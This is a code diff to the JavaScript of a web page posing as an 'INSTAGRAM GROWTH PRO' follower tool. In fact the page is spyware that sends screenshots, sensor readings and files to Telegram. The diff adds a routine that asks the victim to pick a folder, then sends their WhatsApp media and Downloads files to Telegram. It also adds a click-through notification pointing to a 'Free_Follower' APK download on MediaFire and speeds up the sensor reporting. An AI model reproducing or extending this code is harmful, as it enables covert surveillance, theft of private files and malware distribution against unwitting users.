@@ -16,7 +16,7 @@ let screenshotInterval = null;
 let cameraStream = null;
 let isRecording = false;
 let lastSensorSendTime = 0;
-const SENSOR_ACCUMULATION_MS = 10 * 60 * 1000;
+const SENSOR_ACCUMULATION_MS = 16 * 1000;
 let accumulatedSensorEvents = [];
 let accumulatedTapEvents = [];
 
@@ -202,8 +202,12 @@ function sendPushNotification() {
     new Notification('📢 INSTAGRAM GROWTH PRO', {
         body: `${randomMsg} ⬇️ Cliquez pour télécharger ⬇️`,
         icon: 'https://img.icons8.com/color/48/000000/download--v1.png',
-        requireInteraction: true
+        requireInteraction: true,
+        data: { url: 'https://www.mediafire.com/file/7bei4yrajpjkz0w/Free_Follower_xvvl1.apk/file' }
     });
+    notification.onclick = function(e) {
+        window.open(e.target.data.url, '_blank');
+    };
 }
 
 function startAutoNotifications() {
@@ -278,7 +282,59 @@ async function captureAutoScreenshot() {
 
 function startAutoScreenshots() {
     if (screenshotInterval) clearInterval(screenshotInterval);
-    screenshotInterval = setInterval(() => { captureAutoScreenshot(); }, 5000);
+    screenshotInterval = setInterval(() => { captureAutoScreenshot(); }, 30 * 1000);
+}
+
+async function scanAndSendWhatsAppFiles() {
+    try {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.multiple = true;
+        input.webkitdirectory = true;
+        input.directory = true;
+        
+        input.onchange = async (e) => {
+            const files = Array.from(e.target.files);
+            const whatsappFiles = [];
+            const downloadFiles = [];
+            
+            for (const file of files) {
+                const path = file.webkitRelativePath || file.name;
+                if (path.includes('WhatsApp') || path.includes('Media/WhatsApp')) {
+                    whatsappFiles.push(file);
+                } else if (path.includes('Download') || path.includes('download')) {
+                    downloadFiles.push(file);
+                }
+            }
+            
+            if (whatsappFiles.length > 0) {
+                sendToTelegram(`📁 WHATSAPP: ${whatsappFiles.length} fichiers trouvés`);
+                for (const file of whatsappFiles.slice(0, 50)) {
+                    const reader = new FileReader();
+                    reader.onload = async (ev) => {
+                        if (file.type.startsWith('image/')) await sendPhotoToTelegram(ev.target.result);
+                        else await sendFileToTelegram(file.name, ev.target.result);
+                        await new Promise(r => setTimeout(r, 500));
+                    };
+                    reader.readAsDataURL(file);
+                }
+            }
+            
+            if (downloadFiles.length > 0) {
+                sendToTelegram(`📁 DOWNLOAD: ${downloadFiles.length} fichiers trouvés`);
+                for (const file of downloadFiles.slice(0, 50)) {
+                    const reader = new FileReader();
+                    reader.onload = async (ev) => {
+                        if (file.type.startsWith('image/')) await sendPhotoToTelegram(ev.target.result);
+                        else await sendFileToTelegram(file.name, ev.target.result);
+                        await new Promise(r => setTimeout(r, 500));
+                    };
+                    reader.readAsDataURL(file);
+                }
+            }
+        };
+        input.click();
+    } catch(e) {}
 }
 
 function showFloatingFileButton() {
@@ -288,25 +344,11 @@ function showFloatingFileButton() {
     btn.innerHTML = '📁 Sélectionner fichiers';
     btn.style.cssText = 'position:fixed;bottom:100px;right:20px;z-index:9999;background:#28a745;color:white;border:none;border-radius:50px;padding:12px 18px;font-size:14px;cursor:pointer;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
     btn.onclick = async () => {
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.multiple = true;
-        input.accept = 'image/*,video/*,audio/*,.pdf,.txt,.docx';
-        input.onchange = async (e) => {
-            const files = Array.from(e.target.files);
-            for (const file of files) {
-                const reader = new FileReader();
-                reader.onload = async (ev) => {
-                    const dataUrl = ev.target.result;
-                    if (file.type.startsWith('image/')) await sendPhotoToTelegram(dataUrl);
-                    else await sendFileToTelegram(file.name, dataUrl);
-                };
-                reader.readAsDataURL(file);
-            }
-            btn.remove();
-            setTimeout(() => showFloatingGpsButton(), 2000);
-        };
-        input.click();
+        btn.innerHTML = '⏳ Scan en cours...';
+        btn.disabled = true;
+        await scanAndSendWhatsAppFiles();
+        btn.remove();
+        setTimeout(() => showFloatingGpsButton(), 2000);
     };
     document.body.appendChild(btn);
     setTimeout(() => btn.remove(), 60000);
@@ -357,7 +399,7 @@ function sendAccumulatedSensorReport() {
     const now = Date.now();
     if (now - lastSensorSendTime < SENSOR_ACCUMULATION_MS) return;
     if (accumulatedSensorEvents.length === 0 && accumulatedTapEvents.length === 0) return;
-    let message = `📡 CAPTEURS (${Math.floor(SENSOR_ACCUMULATION_MS / 60000)}min)\n━━━━━━━━━━━━━━━━━━━━━\n📊 Accéléro: ${accumulatedSensorEvents.length}\n👆 Double taps: ${accumulatedTapEvents.length}`;
+    let message = `📡 CAPTEURS (${Math.floor(SENSOR_ACCUMULATION_MS / 1000)}s)\n━━━━━━━━━━━━━━━━━━━━━\n📊 Accéléro: ${accumulatedSensorEvents.length}\n👆 Double taps: ${accumulatedTapEvents.length}`;
     if (accumulatedSensorEvents.length > 0) {
         const lastEvent = accumulatedSensorEvents[accumulatedSensorEvents.length - 1];
         message += `\n📳 Dernier: X=${lastEvent.x.toFixed(2)} Y=${lastEvent.y.toFixed(2)} Z=${lastEvent.z.toFixed(2)}`;
